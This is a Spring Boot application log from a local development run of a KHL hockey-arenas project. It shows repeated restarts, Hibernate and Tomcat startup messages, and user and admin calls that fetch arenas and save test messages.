+06-05-2024 14:11:11 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:11:45 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:11:56 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=dfffffffffffffffffffffffffffffffffffhgjgd;gjd;jg;dffffklkdjfffffffdglhgjdlhhhhdjglf)]
+06-05-2024 14:11:56 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:11:56 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:12:09 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=dghjdhljgdlkjdkhjfldhgdfhjklghdf;j;jhgdhggggg)]
+06-05-2024 14:12:09 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:12:09 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:12:16 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:15:31 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:15:31 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:15:31 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:15:34 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 50301 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:15:34 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:15:35 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:15:35 INFO  Finished Spring Data repository scanning in 47 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:15:35 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:15:35 INFO  Starting service [Tomcat]
+06-05-2024 14:15:35 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:15:35 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:15:35 INFO  Root WebApplicationContext: initialization completed in 1226 ms
+06-05-2024 14:15:36 INFO  HikariPool-1 - Starting...
+06-05-2024 14:15:36 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@265a094b
+06-05-2024 14:15:36 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:15:36 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:15:36 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:15:36 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:15:36 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:15:36 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:15:37 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:15:37 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:15:37 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:15:37 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:15:38 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@2f0e7008, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@307e9c02, org.springframework.security.web.context.SecurityContextHolderFilter@5776a9f8, org.springframework.security.web.header.HeaderWriterFilter@5eadc347, org.springframework.web.filter.CorsFilter@682270ff, org.springframework.security.web.authentication.logout.LogoutFilter@5b4ce00, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@550e7ef6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@446fb72e, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@26caf4b6, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6bc08a77, org.springframework.security.web.access.ExceptionTranslationFilter@70f0c352, org.springframework.security.web.access.intercept.AuthorizationFilter@3eadfbbb]
+06-05-2024 14:15:38 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:15:38 INFO  Started KhlArenasProjectApp in 3.987 seconds (process running for 4.243)
+06-05-2024 14:15:44 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:15:44 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:15:44 INFO  Completed initialization in 1 ms
+06-05-2024 14:15:47 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:21:13 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:21:13 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:21:13 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:21:16 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 50948 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:21:16 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:21:17 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:21:17 INFO  Finished Spring Data repository scanning in 50 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:21:17 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:21:17 INFO  Starting service [Tomcat]
+06-05-2024 14:21:17 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:21:17 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:21:17 INFO  Root WebApplicationContext: initialization completed in 1235 ms
+06-05-2024 14:21:17 INFO  HikariPool-1 - Starting...
+06-05-2024 14:21:18 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 14:21:18 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:21:18 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:21:18 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:21:18 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:21:18 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:21:18 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:21:19 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:21:19 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:21:19 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:21:19 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:21:19 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 14:21:20 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:21:20 INFO  Started KhlArenasProjectApp in 4.174 seconds (process running for 4.483)
+06-05-2024 14:21:26 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:21:26 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:21:26 INFO  Completed initialization in 1 ms
+06-05-2024 14:21:29 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:27:24 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:27:35 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=dfffffffffffffffffffffffffffffffffffhgjgd;gjd;jg;dffffklkdjfffffffdglhgjdlhhhhdjglfgfdgfdgfdgfdgfdfgjgfhfhfdfsfdsfdsfdsfsfd543443)]
+06-05-2024 14:27:35 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:27:35 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:27:41 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:31:23 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:31:23 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:31:23 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:31:26 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 51593 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:31:26 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:31:26 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:31:26 INFO  Finished Spring Data repository scanning in 51 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:31:27 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:31:27 INFO  Starting service [Tomcat]
+06-05-2024 14:31:27 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:31:27 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:31:27 INFO  Root WebApplicationContext: initialization completed in 1275 ms
+06-05-2024 14:31:27 INFO  HikariPool-1 - Starting...
+06-05-2024 14:31:27 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@2744dcae
+06-05-2024 14:31:27 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:31:27 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:31:27 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:31:27 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:31:28 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:31:28 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:31:28 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:31:28 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:31:29 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:31:29 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:31:29 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@593e594f, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@3a1e5fa7, org.springframework.security.web.context.SecurityContextHolderFilter@26f7b114, org.springframework.security.web.header.HeaderWriterFilter@29a5f924, org.springframework.web.filter.CorsFilter@7866fe3e, org.springframework.security.web.authentication.logout.LogoutFilter@3eadfbbb, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@4bdbfbc6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@22f0e329, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@3b39bee2, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@498f1f63, org.springframework.security.web.access.ExceptionTranslationFilter@2ddb6c71, org.springframework.security.web.access.intercept.AuthorizationFilter@73072745]
+06-05-2024 14:31:29 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:31:29 INFO  Started KhlArenasProjectApp in 4.003 seconds (process running for 4.276)
+06-05-2024 14:31:31 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:31:31 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:31:31 INFO  Completed initialization in 1 ms
+06-05-2024 14:31:34 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:32:32 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:32:49 INFO  Пользователь: user вызвал метод: saveMessage с параметрами: [Message(id=null, fromUser=user, body=dfffffffffffffffffffffffffffffffffffhgjgd;gjd;jg;dffffklkdjfffffffdglhgjdlhhhhdjglf апраррап равппрпва 355354 54345)]
+06-05-2024 14:32:49 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:32:49 INFO  Пользователь: user вызвал метод: getAllArenas с параметрами: []
+06-05-2024 14:32:56 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:36:45 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:36:45 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:36:45 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:36:58 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 52186 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:36:58 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:36:59 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:36:59 INFO  Finished Spring Data repository scanning in 46 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:36:59 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:36:59 INFO  Starting service [Tomcat]
+06-05-2024 14:36:59 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:36:59 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:36:59 INFO  Root WebApplicationContext: initialization completed in 1300 ms
+06-05-2024 14:37:00 INFO  HikariPool-1 - Starting...
+06-05-2024 14:37:00 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@78d23d6a
+06-05-2024 14:37:00 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:37:00 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:37:00 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:37:00 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:37:00 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:37:00 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:37:01 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:37:01 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:37:01 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:37:01 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:37:01 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@399a5a52, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@1677f98b, org.springframework.security.web.context.SecurityContextHolderFilter@53dd29e0, org.springframework.security.web.header.HeaderWriterFilter@2d093067, org.springframework.web.filter.CorsFilter@30b29f55, org.springframework.security.web.authentication.logout.LogoutFilter@20ddc780, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@202fd4c4, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@70f0c352, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@4e93d23e, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@3eadfbbb, org.springframework.security.web.access.ExceptionTranslationFilter@328e687e, org.springframework.security.web.access.intercept.AuthorizationFilter@20e7152a]
+06-05-2024 14:37:02 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:37:02 INFO  Started KhlArenasProjectApp in 3.95 seconds (process running for 4.253)
+06-05-2024 14:37:05 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:37:05 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:37:05 INFO  Completed initialization in 1 ms
+06-05-2024 14:37:09 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:38:15 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:38:15 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:38:15 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:38:18 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 52364 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:38:18 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:38:18 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:38:18 INFO  Finished Spring Data repository scanning in 66 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:38:19 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:38:19 INFO  Starting service [Tomcat]
+06-05-2024 14:38:19 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:38:19 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:38:19 INFO  Root WebApplicationContext: initialization completed in 1284 ms
+06-05-2024 14:38:19 INFO  HikariPool-1 - Starting...
+06-05-2024 14:38:20 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 14:38:20 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:38:20 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:38:20 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:38:20 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:38:20 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:38:20 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:38:21 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:38:21 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:38:21 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:38:21 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:38:21 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 14:38:21 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:38:21 INFO  Started KhlArenasProjectApp in 4.112 seconds (process running for 4.401)
+06-05-2024 14:38:28 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:38:28 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:38:28 INFO  Completed initialization in 1 ms
+06-05-2024 14:38:31 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:42:13 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:42:13 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:42:13 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:42:15 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 53060 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:42:15 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:42:16 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:42:16 INFO  Finished Spring Data repository scanning in 48 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:42:16 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:42:16 INFO  Starting service [Tomcat]
+06-05-2024 14:42:16 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:42:16 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:42:16 INFO  Root WebApplicationContext: initialization completed in 1287 ms
+06-05-2024 14:42:17 INFO  HikariPool-1 - Starting...
+06-05-2024 14:42:17 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 14:42:17 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:42:17 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:42:17 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:42:17 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:42:17 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:42:17 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:42:18 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:42:18 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:42:18 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:42:18 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:42:19 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@7866fe3e, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@498f1f63, org.springframework.security.web.context.SecurityContextHolderFilter@22f0e329, org.springframework.security.web.header.HeaderWriterFilter@7e1ce99c, org.springframework.web.filter.CorsFilter@6250d33c, org.springframework.security.web.authentication.logout.LogoutFilter@7c9c7e7d, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@758ac46, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@20ddc780, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@6889e714, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@2a7b4bb6, org.springframework.security.web.access.ExceptionTranslationFilter@6c569caf, org.springframework.security.web.access.intercept.AuthorizationFilter@79735611]
+06-05-2024 14:42:19 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:42:19 INFO  Started KhlArenasProjectApp in 4.045 seconds (process running for 4.354)
+06-05-2024 14:42:26 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:42:26 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:42:26 INFO  Completed initialization in 1 ms
+06-05-2024 14:42:29 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:48:41 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:51:43 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:51:43 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:51:43 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:57:30 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 53964 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:57:30 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:57:31 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:57:31 INFO  Finished Spring Data repository scanning in 54 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:57:31 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:57:31 INFO  Starting service [Tomcat]
+06-05-2024 14:57:31 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:57:31 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:57:31 INFO  Root WebApplicationContext: initialization completed in 1272 ms
+06-05-2024 14:57:31 INFO  HikariPool-1 - Starting...
+06-05-2024 14:57:32 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@634ca3e7
+06-05-2024 14:57:32 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:57:32 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:57:32 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:57:32 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:57:32 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:57:32 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:57:33 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:57:33 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:57:33 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:57:33 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:57:33 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@4197e859, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@73072745, org.springframework.security.web.context.SecurityContextHolderFilter@2ddb6c71, org.springframework.security.web.header.HeaderWriterFilter@2c750b69, org.springframework.web.filter.CorsFilter@4bdbfbc6, org.springframework.security.web.authentication.logout.LogoutFilter@3b72860c, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@37922937, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@6c569caf, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@29a5f924, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@79735611, org.springframework.security.web.access.ExceptionTranslationFilter@446fb72e, org.springframework.security.web.access.intercept.AuthorizationFilter@6bc08a77]
+06-05-2024 14:57:34 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:57:34 INFO  Started KhlArenasProjectApp in 4.221 seconds (process running for 4.502)
+06-05-2024 14:57:43 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:57:43 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:57:43 INFO  Completed initialization in 1 ms
+06-05-2024 14:57:48 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:58:13 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:58:13 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:58:13 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:58:17 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 54275 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:58:17 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:58:17 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:58:17 INFO  Finished Spring Data repository scanning in 51 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:58:18 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:58:18 INFO  Starting service [Tomcat]
+06-05-2024 14:58:18 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:58:18 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:58:18 INFO  Root WebApplicationContext: initialization completed in 1300 ms
+06-05-2024 14:58:18 INFO  HikariPool-1 - Starting...
+06-05-2024 14:58:19 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 14:58:19 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:58:19 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:58:19 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:58:19 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:58:19 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
